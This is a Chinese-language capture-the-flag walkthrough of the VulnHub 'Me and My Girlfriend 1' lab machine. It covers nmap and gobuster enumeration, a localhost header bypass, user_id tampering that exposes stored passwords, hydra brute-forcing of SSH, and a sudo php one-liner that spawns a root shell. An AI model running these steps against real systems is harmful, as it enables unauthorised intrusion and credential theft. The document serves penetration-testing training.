# Me-and-My-Girlfriend-1主机渗透实现

- 靶机地址：https://www.vulnhub.com/entry/me-and-my-girlfriend-1,409/
- 下载地址：https://download.vulnhub.com/meandmygirlfriend/Me-and-My-Girlfriend-1.ova



## 信息收集：

### 主机发现

- 主机IP网段：`192.168.2.1/24`主机IP为：`192.168.2.2`

- ```shell
  └─$ sudo nmap -sn --min-rate 10000 192.168.2.1/24                   
  Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-18 05:44 EDT
  Nmap scan report for 192.168.2.1
  Host is up (0.016s latency).
  MAC Address: 00:50:56:C0:00:01 (VMware)
  Nmap scan report for 192.168.2.7
  Host is up (0.00017s latency).
  MAC Address: 00:0C:29:49:17:22 (VMware)
  Nmap scan report for 192.168.2.254
  Host is up (0.000096s latency).
  MAC Address: 00:50:56:E4:FB:DB (VMware)
  
  ```



### 端口扫描

- TCP端口扫描

- ```shell
  └─$ sudo nmap -sT --min-rate 10000 192.168.2.7 -oA Nmap-scan/sT
  Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-18 05:46 EDT
  Nmap scan report for 192.168.2.7
  Host is up (0.0016s latency).
  Not shown: 998 closed tcp ports (conn-refused)
  PORT   STATE SERVICE
  22/tcp open  ssh
  80/tcp open  http
  MAC Address: 00:0C:29:49:17:22 (VMware)
  
  Nmap done: 1 IP address (1 host up) scanned in 6.75 seconds
  ```

- UDP端口扫描

- ```shell
  └─$ sudo nmap -sU --min-rate 10000 192.168.2.7 -oA Nmap-scan/sU
  Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-18 05:47 EDT
  Nmap scan report for 192.168.2.7
  Host is up (0.00020s latency).
  Not shown: 994 open|filtered udp ports (no-response)
  PORT      STATE  SERVICE
  3/udp     closed compressnet
  1014/udp  closed unknown
  1043/udp  closed boinc
  49169/udp closed unknown
  49196/udp closed unknown
  61322/udp closed unknown
  MAC Address: 00:0C:29:49:17:22 (VMware)
  
  Nmap done: 1 IP address (1 host up) scanned in 7.00 seconds
  
  ```



### 服务及操作系统扫描

- ```shell
  └─$ sudo nmap --min-rate 10000 -sC -sV -O -p22,80 192.168.2.7 -oA Nmap-scan/sC
  Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-18 05:48 EDT
  Nmap scan report for 192.168.2.7
  Host is up (0.00030s latency).
  
  PORT   STATE SERVICE VERSION
  22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   1024 57:e1:56:58:46:04:33:56:3d:c3:4b:a7:93:ee:23:16 (DSA)
  |   2048 3b:26:4d:e4:a0:3b:f8:75:d9:6e:15:55:82:8c:71:97 (RSA)
  |   256 8f:48:97:9b:55:11:5b:f1:6c:1d:b3:4a:bc:36:bd:b0 (ECDSA)
  |_  256 d0:c3:02:a1:c4:c2:a8:ac:3b:84:ae:8f:e5:79:66:76 (ED25519)
  80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
  |_http-title: Site doesn't have a title (text/html).
  |_http-server-header: Apache/2.4.7 (Ubuntu)
  MAC Address: 00:0C:29:49:17:22 (VMware)
  Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
  Device type: general purpose
  Running: Linux 3.X|4.X
  OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
  OS details: Linux 3.2 - 4.9
  Network Distance: 1 hop
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
  
  OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  Nmap done: 1 IP address (1 host up) scanned in 14.52 seconds
  ```



### 默认漏洞脚本扫描

- ```shell
  └─$ sudo nmap --script=vuln -p22,80 192.168.2.7 -oA Nmap-scan/Script
  Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-18 05:50 EDT
  Stats: 0:03:05 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
  NSE Timing: About 98.52% done; ETC: 05:54 (0:00:03 remaining)
  Stats: 0:05:21 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
  NSE Timing: About 99.01% done; ETC: 05:56 (0:00:03 remaining)
  Stats: 0:05:22 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
  NSE Timing: About 99.01% done; ETC: 05:56 (0:00:03 remaining)
  Stats: 0:05:22 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
  NSE Timing: About 99.01% done; ETC: 05:56 (0:00:03 remaining)
  Stats: 0:05:23 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
  NSE Timing: About 99.01% done; ETC: 05:56 (0:00:03 remaining)
  Stats: 0:05:23 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
  NSE Timing: About 99.01% done; ETC: 05:56 (0:00:03 remaining)
  Stats: 0:05:23 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
  NSE Timing: About 99.01% done; ETC: 05:56 (0:00:03 remaining)
  Nmap scan report for 192.168.2.7
  Host is up (0.00031s latency).
  
  PORT   STATE SERVICE
  22/tcp open  ssh
  80/tcp open  http
  |_http-csrf: Couldn't find any CSRF vulnerabilities.
  |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
  |_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
  |_http-dombased-xss: Couldn't find any DOM based XSS.
  | http-enum: 
  |   /robots.txt: Robots file
  |   /config/: Potentially interesting directory w/ listing on 'apache/2.4.7 (ubuntu)'
  |_  /misc/: Potentially interesting directory w/ listing on 'apache/2.4.7 (ubuntu)'
  MAC Address: 00:0C:29:49:17:22 (VMware)
  
  Nmap done: 1 IP address (1 host up) scanned in 327.21 seconds
  
  ```



## web信息收集：

### 使用`gobuster`进行扫描

- ```shell
  └─$ sudo gobuster dir -u http://192.168.2.7/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster -x txt,zip,tar,rar,jsp,php,asp
  ===============================================================
  Gobuster v3.5
  by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
  ===============================================================
  [+] Url:                     http://192.168.2.7/
  [+] Method:                  GET
  [+] Threads:                 10
  [+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
  [+] Negative Status codes:   404
  [+] User Agent:              gobuster/3.5
  [+] Extensions:              txt,zip,tar,rar,jsp,php,asp
  [+] Timeout:                 10s
  ===============================================================
  2023/08/18 06:00:06 Starting gobuster in directory enumeration mode
  ===============================================================
  /.php                 (Status: 403) [Size: 282]
  /index.php            (Status: 200) [Size: 120]
  /misc                 (Status: 301) [Size: 308] [--> http://192.168.2.7/misc/]
  /config               (Status: 301) [Size: 310] [--> http://192.168.2.7/config/]
  /robots.txt           (Status: 200) [Size: 32]
  /.php                 (Status: 403) [Size: 282]
  /server-status        (Status: 403) [Size: 291]
  Progress: 1761313 / 1764488 (99.82%)
  ===============================================================
  2023/08/18 06:04:02 Finished
  ===============================================================
  
  ```

- 将两个文件夹中的文件全部下载之后，查看全部都是空文件... 

- 根据主页提示将请求头设置为`localhost`

- ![image-20230818183708317](https://raw.githubusercontent.com/r0o983/images/main/202308181837372.png)

- 注册任意账号登录后可以看到`user_id`为12，尝试修改`user_id`,发现这里并没有做任何验证，以及用户密码都是直接显示在前台处

- ![image-20230818203400446](https://raw.githubusercontent.com/r0o983/images/main/202308182034517.png)

- 由于我们的用户id为12，猜测前面应该有11个用户信息，全部采集后使用hydra进行爆破登录ssh

- ![image-20230818204134772](https://raw.githubusercontent.com/r0o983/images/main/202308182041815.png)



### 获得初始shell

- 使用`hydra`破解得到的账号密码来进行登录，`alice && 4clic3`

- ```shell
  └─$ ssh alice@192.168.2.7                                           
  alice@192.168.2.7's password: 
  Last login: Fri Dec 13 14:48:25 2019
  alice@gfriEND:~$ uname -a
  Linux gfriEND 4.4.0-142-generic #168~14.04.1-Ubuntu SMP Sat Jan 19 11:26:28 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
  alice@gfriEND:~$ id
  uid=1000(alice) gid=1001(alice) groups=1001(alice)
  alice@gfriEND:~$ ip a
  1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
      link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
      inet 127.0.0.1/8 scope host lo
         valid_lft forever preferred_lft forever
      inet6 ::1/128 scope host 
         valid_lft forever preferred_lft forever
  2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
      link/ether 00:0c:29:49:17:22 brd ff:ff:ff:ff:ff:ff
      inet 192.168.2.7/24 brd 192.168.2.255 scope global eth0
         valid_lft forever preferred_lft forever
      inet6 fe80::20c:29ff:fe49:1722/64 scope link 
         valid_lft forever preferred_lft forever
  alice@gfriEND:~$ cd /home/
  aingmaung/      alice/          eweuhtandingan/ sundatea/       
  alice@gfriEND:~$ cd /home/
  alice@gfriEND:/home$ cd alice/
  alice@gfriEND:~$ ls -lhai
  total 32K
   21088 drwxr-xr-x 4 alice alice 4.0K Dec 13  2019 .
      12 drwxr-xr-x 6 root  root  4.0K Dec 13  2019 ..
   21128 -rw------- 1 alice alice   10 Dec 13  2019 .bash_history
   21090 -rw-r--r-- 1 alice alice  220 Dec 13  2019 .bash_logout
   21089 -rw-r--r-- 1 alice alice 3.6K Dec 13  2019 .bashrc
   21126 drwx------ 2 alice alice 4.0K Dec 13  2019 .cache
  142082 drwxrwxr-x 2 alice alice 4.0K Dec 13  2019 .my_secret
   21091 -rw-r--r-- 1 alice alice  675 Dec 13  2019 .profile
  alice@gfriEND:~$ sudo -l
  Matching Defaults entries for alice on gfriEND:
      env_reset, mail_badpass,
      secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
  
  User alice may run the following commands on gfriEND:
      (root) NOPASSWD: /usr/bin/php
  alice@gfriEND:~$ 
  ```

- 调用php可以直接拿到root权限

## 提权：

- 使用`php`一条语句直接提权成功：`sudo /usr/bin/php -r "system('/bin/bash');"`

- ```shell
  alice@gfriEND:~$ sudo -l
  Matching Defaults entries for alice on gfriEND:
      env_reset, mail_badpass,
      secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
  
  User alice may run the following commands on gfriEND:
      (root) NOPASSWD: /usr/bin/php
  
  alice@gfriEND:~$ sudo /usr/bin/php -r "system('/bin/bash');"
  root@gfriEND:~# whoami
  root
  root@gfriEND:~# ip a
  1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
      link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
      inet 127.0.0.1/8 scope host lo
         valid_lft forever preferred_lft forever
      inet6 ::1/128 scope host 
         valid_lft forever preferred_lft forever
  2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
      link/ether 00:0c:29:49:17:22 brd ff:ff:ff:ff:ff:ff
      inet 192.168.2.7/24 brd 192.168.2.255 scope global eth0
         valid_lft forever preferred_lft forever
      inet6 fe80::20c:29ff:fe49:1722/64 scope link 
         valid_lft forever preferred_lft forever
  root@gfriEND:~# uname -a
  Linux gfriEND 4.4.0-142-generic #168~14.04.1-Ubuntu SMP Sat Jan 19 11:26:28 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
  root@gfriEND:~# cd /root/
  root@gfriEND:/root# ls -lhai
  total 32K
  393313 drwx------  3 root root 4.0K Dec 13  2019 .
       2 drwxr-xr-x 22 root root 4.0K Dec 13  2019 ..
  393317 -rw-------  1 root root    0 Dec 13  2019 .bash_history
  393314 -rw-r--r--  1 root root 3.1K Feb 20  2014 .bashrc
  420354 drwx------  2 root root 4.0K Dec 13  2019 .cache
  419444 -rw-r--r--  1 root root 1000 Dec 13  2019 flag2.txt
  420368 -rw-------  1 root root  238 Dec 13  2019 .mysql_history
  419443 -rw-------  1 root root   81 Dec 13  2019 .nano_history
  393315 -rw-r--r--  1 root root  140 Feb 20  2014 .profile
  root@gfriEND:/root# cat flag2.txt 
  
    ________        __    ___________.__             ___________.__                ._.
   /  _____/  _____/  |_  \__    ___/|  |__   ____   \_   _____/|  | _____     ____| |
  /   \  ___ /  _ \   __\   |    |   |  |  \_/ __ \   |    __)  |  | \__  \   / ___\ |
  \    \_\  (  <_> )  |     |    |   |   Y  \  ___/   |     \   |  |__/ __ \_/ /_/  >|
   \______  /\____/|__|     |____|   |___|  /\___  >  \___  /   |____(____  /\___  /__
          \/                              \/     \/       \/              \//_____/ \/
  
  Yeaaahhhh!! You have successfully hacked this company server! I hope you who have just learned can get new knowledge from here :) I really hope you guys give me feedback for this challenge whether you like it or not because it can be a reference for me to be even better! I hope this can continue :)
  
  Contact me if you want to contribute / give me feedback / share your writeup!
  Twitter: @makegreatagain_
  Instagram: @aldodimas73
  
  Thanks! Flag 2: gfriEND{56fbeef560930e77ff984b644fde66e7}
  root@gfriEND:/root# 
  
  ```

- 还少一个flag，在`/home/alice/.my_secret/flag1.txt`下。

- ```shell
  root@gfriEND:~# find / -name "flag*.txt" -type f 2>/dev/null 
  /root/flag2.txt
  /home/alice/.my_secret/flag1.txt
  root@gfriEND:~# cat /home/alice/.my_secret/flag1.txt
  Greattttt my brother! You saw the Alice's note! Now you save the record information to give to bob! I know if it's given to him then Bob will be hurt but this is better than Bob cheated!
  
  Now your last job is get access to the root and read the flag ^_^
  
  Flag 1 : gfriEND{2f5f21b2af1b8c3e227bcf35544f8f09}
  root@gfriEND:~# 
  
  ```

- 当前系统两个flag均已拿下。

